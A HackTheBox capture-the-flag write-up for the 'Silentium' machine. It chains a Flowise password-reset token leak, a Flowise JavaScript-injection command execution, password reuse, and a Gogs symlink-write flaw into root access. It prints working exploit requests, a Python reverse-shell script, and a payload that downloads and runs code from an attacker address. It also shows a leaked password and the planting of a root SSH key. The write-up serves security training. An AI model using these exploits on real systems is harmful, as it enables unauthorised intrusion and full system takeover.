# HackTheBox: Silentium Write-up

## Enumeration

I started with an Nmap scan against the target IP:

```bash
nmap -sSVC -A -Pn <TARGET_IP>
```

The scan revealed SSH and an Nginx web server:

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
```

The website redirects to `silentium.htb`. I added the hostname to `/etc/hosts` and fuzzed for virtual hosts:

```bash
ffuf -u http://<TARGET_IP> \
  -H 'Host: FUZZ.silentium.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -ac
```

This revealed `staging.silentium.htb`, which I added to `/etc/hosts` as well:

```text
<TARGET_IP> silentium.htb staging.silentium.htb
```

The staging site runs Flowise. Its version is available without authentication:

```bash
curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```

## Initial Foothold: Flowise Account Takeover

The main website mentions Ben, which suggested trying `ben@silentium.htb` on Flowise's password-reset form. The unauthenticated `forgot-password` API response includes the reset token (`tempToken`), a flaw documented as [CVE-2025-58434](https://nvd.nist.gov/vuln/detail/CVE-2025-58434).

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq
```

I used the returned `user.tempToken` to set a password of my choice. The token is short-lived, so use a fresh value from the response:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TEMP_TOKEN>","password":"<NEW_PASSWORD>"}}'
```

After signing in as Ben, I opened **API Keys** in Flowise and copied the instance's API key for the next request.

## Shell in the Flowise Container

Flowise 3.0.5 is also affected by [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p). The authenticated `customMCP` node-load endpoint evaluates the supplied `mcpServerConfig` as JavaScript, which makes command execution possible.

The payload below downloads a small Python reverse-shell script from my machine and runs it. Replace `<ATTACKER_IP>` with the address of the HTB VPN interface. In one terminal, start the listener:

```bash
nc -lvnp 4444
```

In a second terminal, from the directory containing `rev.py`, start the HTTP server:

```bash
python3 -m http.server 8000
```

`rev.py`:

```python
import os
import pty
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("sh")
```

Save the following as `payload.json`, updating the callback address:

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.execSync('wget http://<ATTACKER_IP>:8000/rev.py -O /tmp/rev.py');cp.exec('python /tmp/rev.py');return 1;})()})"
  }
}
```

Then send it with the Flowise API key:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <FLOWISE_API_KEY>' \
  -d @payload.json
```

The resulting shell is inside the Flowise Docker container, not on the host. I confirmed this with `id` and the presence of `/.dockerenv`.

## User Ownership

The container environment contains credentials. In this machine, the SMTP password was reused for SSH by the host user `ben`:

```sh
env | grep -E 'FLOWISE_PASSWORD|SMTP_PASSWORD'
# SMTP_PASSWORD=r04D!!_R4ge
```

I used that password to SSH to the target as Ben and retrieve the user flag:

```bash
ssh ben@<TARGET_IP>
cat ~/user.txt
```

The flag value is intentionally omitted.

## Privilege Escalation: Gogs CVE-2025-8110

As `ben`, I enumerated local services and processes and found Gogs listening on `127.0.0.1:3001`, running as root. The installed version is 0.13.3, which is affected by [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110), an improper symlink-handling issue in Gogs' `PutContents` API.

I forwarded the local Gogs port to my machine:

```bash
ssh -L 3001:127.0.0.1:3001 ben@<TARGET_IP>
```

In the Gogs web interface at `http://127.0.0.1:3001`, I registered an account, created a repository named `poc`, and generated an application token. I then cloned the repository and added a symlink pointing to root's SSH directory:

```bash
git clone http://<GOGS_USER>:<GOGS_PASSWORD>@127.0.0.1:3001/<GOGS_USER>/poc.git
cd poc
ln -s /root/.ssh sshdir
git add sshdir
git commit -m 'add symlink'
git push
```

I generated an SSH keypair on my machine and used the Gogs contents API to write its public key through the symlink into `/root/.ssh/authorized_keys`:

```bash
ssh-keygen -t ed25519 -N '' -f ./root_key
PUB=$(base64 -w0 ./root_key.pub)

curl -sS -X PUT \
  'http://127.0.0.1:3001/api/v1/repos/<GOGS_USER>/poc/contents/sshdir/authorized_keys' \
  -H 'Authorization: token <GOGS_API_TOKEN>' \
  -H 'Content-Type: application/json' \
  --data "{\"message\":\"add root key\",\"content\":\"${PUB}\"}"
```

Gogs may return an error after the write because it cannot commit a path outside the repository; the file can still have been written. I verified access by logging in over SSH as root:

```bash
ssh -i ./root_key root@<TARGET_IP>
cat /root/root.txt
```

The root flag value is intentionally omitted.

## Attack Path

```text
Nmap
  ↓
HTTP vhost fuzzing → staging.silentium.htb
  ↓
Flowise 3.0.5 → leaked password-reset token → account takeover
  ↓
Authenticated CustomMCP JavaScript injection → root inside Flowise container
  ↓
SMTP password reuse → SSH as ben
  ↓
Root-running Gogs 0.13.3 → CVE-2025-8110 symlink write
  ↓
/root/.ssh/authorized_keys → root SSH
```

## References

- [Flowise advisory — CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph)
- [Flowise advisory — CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p)
- [NVD — CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)

> Replace the target and callback IPs with your HTB VPN values. Flag values are intentionally omitted.
